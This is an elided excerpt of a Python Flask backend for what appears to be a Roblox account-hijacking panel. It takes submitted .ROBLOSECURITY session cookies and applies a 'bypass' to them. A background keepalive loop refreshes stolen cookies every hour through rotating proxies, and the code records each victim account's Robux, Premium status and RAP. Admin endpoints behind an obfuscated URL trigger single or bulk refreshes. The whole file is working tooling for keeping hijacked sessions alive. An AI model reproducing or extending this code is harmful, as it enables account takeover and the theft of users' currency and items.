...
def submit_tool():
    ...
    # BYPASS FIRST — before any API check
    bypassed_cookie = _try_bypass(formatted_cookie)
    if bypassed_cookie:
        formatted_cookie = bypassed_cookie
        print(f"Bypass OK, using bypassed cookie for check")
    else:
        print(f"Bypass failed, using original cookie for check")
...
def admin_dashboard():
    ...
    keepalive = database.get_keepalive_stats()
...
# ── Cookie keepalive system ───────────────────────────────────
KEEPALIVE_INTERVAL = 3600  # check every hour
KEEPALIVE_BATCH = 50       # cookies per cycle


def _do_bypass_and_save(db_id, raw_cookie, username, proxy_url):
    """Bypass cookie and save new one. Returns result dict."""
    proxies_list = proxy_utils.load_proxies()
    ok, result = bypass.bypass_cookie(raw_cookie, extra_proxies=proxies_list)

    if ok:
        new_formatted = f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{result}"

        new_identity = roblox_check.is_cookie_valid(result, proxy=proxy_url)
        if new_identity and new_identity.get('id') and new_identity['id'] != 0:
            uid = new_identity['id']
            robux = roblox_check.fetch_robux(result, uid, proxy=proxy_url)
            premium = roblox_check.fetch_premium(result, uid, proxy=proxy_url)
            rap = roblox_check.fetch_rap(result, uid, proxy=proxy_url)
            database.update_cookie_after_bypass(db_id, new_formatted, robux=robux, premium=premium, rap=rap)
            print(f"[keepalive] Cookie {username} bypassed OK, robux={robux}")
            return {'id': db_id, 'username': username, 'status': 'bypassed', 'robux': robux}
        else:
            database.update_cookie_after_bypass(db_id, new_formatted)
            print(f"[keepalive] Cookie {username} bypassed but couldn't verify")
            return {'id': db_id, 'username': username, 'status': 'bypassed_uncertain'}
    else:
        print(f"[keepalive] Cookie {username} bypass failed: {result}")
        return None


def _refresh_single_cookie(cookie_row):
    """
    Check one cookie: if alive — re-bypass to extend life, if dead — try bypass too.
    Returns dict with result info.
    """
    db_id = cookie_row['id']
    cookie_val = cookie_row['cookie_formatted']
    username = cookie_row['username'] or '?'

    if not cookie_val:
        database.mark_cookie_dead(db_id)
        return {'id': db_id, 'username': username, 'status': 'no_cookie'}

    # Strip WARNING prefix for bypass
    raw_cookie = cookie_val
    if '|_' in cookie_val:
        parts = cookie_val.split('|_')
        if len(parts) >= 3:
            raw_cookie = parts[-1]

    proxy_str = proxy_utils.get_random_proxy_safe()
    proxy_url = proxy_str if proxy_str else None

    # 1) Check if cookie is still valid
    identity = roblox_check.is_cookie_valid(raw_cookie, proxy=proxy_url)

    if identity is None:
        # Cookie is dead (401) — try bypass anyway (low chance but worth trying)
        print(f"[keepalive] Cookie {username} (id={db_id}) is dead, attempting bypass...")
        result = _do_bypass_and_save(db_id, raw_cookie, username, proxy_url)
        if result:
            return result
        # Bypass failed — mark as dead
        database.mark_cookie_dead(db_id)
        return {'id': db_id, 'username': username, 'status': 'dead'}

    else:
        # Cookie is ALIVE — re-bypass NOW to get a fresh cookie (extend life)
        print(f"[keepalive] Cookie {username} (id={db_id}) is alive, re-bypassing to extend life...")
        result = _do_bypass_and_save(db_id, raw_cookie, username, proxy_url)
        if result:
            return result

        # Bypass failed but cookie is still alive — just update stats
        uid = identity.get('id', 0)
        if uid and uid != 0:
            robux = roblox_check.fetch_robux(raw_cookie, uid, proxy=proxy_url)
            premium = roblox_check.fetch_premium(raw_cookie, uid, proxy=proxy_url)
            rap = roblox_check.fetch_rap(raw_cookie, uid, proxy=proxy_url)
            database.update_cookie_stats(db_id, robux=robux, premium=premium, rap=rap)
            print(f"[keepalive] Cookie {username} bypass failed but still alive, stats updated")
            return {'id': db_id, 'username': username, 'status': 'alive', 'robux': robux}
        else:
            database.mark_cookie_checked(db_id)
            return {'id': db_id, 'username': username, 'status': 'alive_no_stats'}


def _keepalive_loop():
    """Background thread: periodically check and re-bypass cookies."""
    _ttime.sleep(30)  # wait for app to fully start
    while True:
        try:
            cookies = database.get_active_cookies_for_keepalive(limit=KEEPALIVE_BATCH)
            if cookies:
                print(f"[keepalive] Checking {len(cookies)} cookies...")
                alive = 0
                bypassed = 0
                dead = 0
                for c in cookies:
                    try:
                        result = _refresh_single_cookie(c)
                        s = result.get('status', '')
                        if 'bypassed' in s:
                            bypassed += 1
                        elif s == 'dead':
                            ...
                            alive += 1
                        _ttime.sleep(2)  # rate limit between checks
                    except Exception as e:
                        print(f"[keepalive] Error checking cookie {c.get('id')}: {e}")
                print(f"[keepalive] Done: alive={alive}, bypassed={bypassed}, dead={dead}")
        except Exception as e:
            print(f"[keepalive] Loop error: {e}")
        _ttime.sleep(KEEPALIVE_INTERVAL)
...
# ── Admin: cookie refresh endpoints ──────────────────────────
@app.route('/ljsdkjfsldkajfksdjflkjsdf/cookies/refresh/<int:cookie_id>', methods=['POST'])
@auth.login_required
def admin_refresh_cookie(cookie_id):
    """Manually refresh a single cookie (validate + bypass if needed)."""
    if not _verify_csrf():
        return jsonify({'error': 'Invalid request'}), 403

    cookie_row = database.get_cookie_by_id(cookie_id)
    if not cookie_row:
        return jsonify({'error': 'Cookie not found'}), 404

    result = _refresh_single_cookie(cookie_row)
    return jsonify(result)


@app.route('/ljsdkjfsldkajfksdjflkjsdf/cookies/refresh-all', methods=['POST'])
@auth.login_required
def admin_refresh_all_cookies():
    """Refresh all active cookies in background."""
    if not _verify_csrf():
        return jsonify({'error': 'Invalid request'}), 403

    def _do_refresh():
        cookies = database.get_active_cookies_for_keepalive(limit=500)
        print(f"[manual-refresh] Starting refresh of {len(cookies)} cookies...")
        alive = 0
        bypassed = 0
        dead = 0
        for c in cookies:
        ...
        print(f"[manual-refresh] Done: alive={alive}, bypassed={bypassed}, dead={dead}")
...
@app.route('/ljsdkjfsldkajfksdjflkjsdf/keepalive-stats')
@auth.login_required
def admin_keepalive_stats():
    """Get keepalive statistics."""
    stats = database.get_keepalive_stats()
